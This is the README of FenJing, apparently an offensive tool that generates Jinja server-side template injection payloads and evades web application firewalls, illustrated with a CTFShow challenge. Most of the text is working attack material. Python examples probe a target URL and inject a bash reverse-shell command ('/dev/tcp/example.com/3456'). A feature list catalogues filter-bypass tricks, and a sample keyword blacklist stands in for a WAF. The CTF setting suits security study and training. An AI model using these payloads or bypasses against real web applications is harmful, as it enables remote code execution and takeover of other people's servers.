![](./fenjing.webp)

> Bypassing the WAF without knowing WAF

![中文](./README_zh.md)

## Introduction

FenJing is a payload generator targeting on Jinja SSTI. It focus on automatically detecting and bypassing WAF.


## Usage

Example：[CTFShow]web372

First, you should write a function that receive a string. If the string contains characters that would be WAF, return False, otherwise return True.

```python
@functools.lru_cache
def waf(s: str):

    time.sleep(0.1)
    r = requests.get(url, params = {
        "name": s
    })

    return r.text != ":("
```

Then pass this function and the shell command you need to this module. The module would generate payload for you.

```python
payload = shell_cmd(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3003 0>&1\"")
```

Full example

```python
from ssti import shell_cmd

import functools
import time
import requests
import logging

logging.basicConfig(level = logging.WARNING)

# ctf.show web372
url = "http://ddde51f2-ff61-4f88-a9a7-3af3654a76b8.challenge.ctf.show/"

@functools.lru_cache
def waf(s: str):
    time.sleep(0.1)
    r = requests.get(url, params = {
        "name": s
    })

    return r.text != ":("

payload = shell_cmd(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")

r = requests.get(url, params = {
    "name": payload
})

print(r.text)
```

## Feature

It supports bypassing:

- `'` and `"`
- Most of the keywords
- any number
- `_`
- `[`
- `+`
- `-`
- `~`
- `{{`

### Bypassing for natural numbers:

It supports bypassing `+` or `-` when bypassing 0-9 at the same time.

It supports two ways for bypassing number detection:

- Full-width numerals
- Calculate any natural number with `+`, `-` and some special variables.  

### Bypassing for `'%c'`:

Support bypassing `'`, `"`, `g` and `lipsum`.

### Bypassing for `_`：

Support `(lipsum|escape|batch(22)|list|first|last)`
- number 22 support the bypassing mentioned above.

### Bypassing for any string:

Supprot bypassing `'`, `"`, `+`, `_`, `~` and any keyword.

It supports these forms:

- `'str'`
- `"str"`
- `"\x61\x61\x61"`
- `dict(__class__=cycler)|join`
- `'%c'*3%(97,97,97)`

### Bypassing for any attributes:

- `['aaa']`
- `.aaa`
- `|attr('aaa')`

### Bypassing for any item:

- `['aaa']`
- `.aaa`
- `.__getitem__('aaa')`


### Example for testing:

```python
from ssti import shell_cmd
import logging

logging.basicConfig(level = logging.WARNING)

def waf(s: str):
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "request", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]

    for word in blacklist:
        if word in s:
            return False
    return True

payload = shell_cmd(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")

print(payload)
```
